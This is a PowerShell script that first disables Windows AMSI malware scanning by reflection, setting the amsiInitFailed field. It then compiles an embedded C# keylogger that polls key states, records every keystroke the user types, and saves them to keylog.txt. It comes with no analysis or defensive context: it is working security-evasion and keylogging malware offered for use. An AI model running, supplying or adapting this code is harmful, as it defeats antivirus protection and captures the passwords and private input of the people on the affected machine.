function Bypass-AMSI {
    $amsi = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
    $type = $amsi.GetType('System.Management.Automation.AmsiUtils')
    $field = $type.GetField('amsiInitFailed', 'NonPublic,Static')
    $field.SetValue($null, $true)
    Write-Host "[+] AMSI Bypass Applied" -ForegroundColor Green
}
# Apply AMSI Bypass
Bypass-AMSI 

Add-Type -TypeDefinition @"
using System;
using System.Text;
using System.Runtime.InteropServices;

public static class KeyLogger
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
    public static extern short GetKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
        [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
        int bufferSize, uint flags);

    public static string GetKeyPressed()
    {
        StringBuilder result = new StringBuilder();
        byte[] keyboardState = new byte[256];
        for (int i = 0; i < 255; i++)
        {
            int state = GetAsyncKeyState(i);
            if (state == -32767) // Key pressed
            {
                // Check if the shift key is pressed for case sensitivity
                bool shiftPressed = (GetKeyState(0x10) & 0x8000) != 0;

                keyboardState[0x10] = (byte)(shiftPressed ? 0x80 : 0x00);

                StringBuilder buffer = new StringBuilder(64);
                ToUnicode((uint)i, 0, keyboardState, buffer, buffer.Capacity, 0);
                result.Append(buffer.ToString());
            }
        }
        return result.ToString();
    }
}
"@ -Language CSharp

# Function to capture keystrokes
function Start-KeyLogger {
    $loggedKeys = @()
    Write-Host "Keylogger started. Press Ctrl+C to stop."
    
    try {
        while ($true) {
            $key = [KeyLogger]::GetKeyPressed()
            if (![string]::IsNullOrEmpty($key)) {
                $loggedKeys += $key
                Write-Host -NoNewline $key
            }
            Start-Sleep -Milliseconds 10
        }
    } catch {
        Write-Host "Error: $_"
    } finally {
        $loggedKeys | Out-File -FilePath "keylog.txt" -Encoding UTF8
        Write-Host "`nKeylogger stopped. Keys saved to keylog.txt"
    }
}

# Start the keylogger
Start-KeyLogger
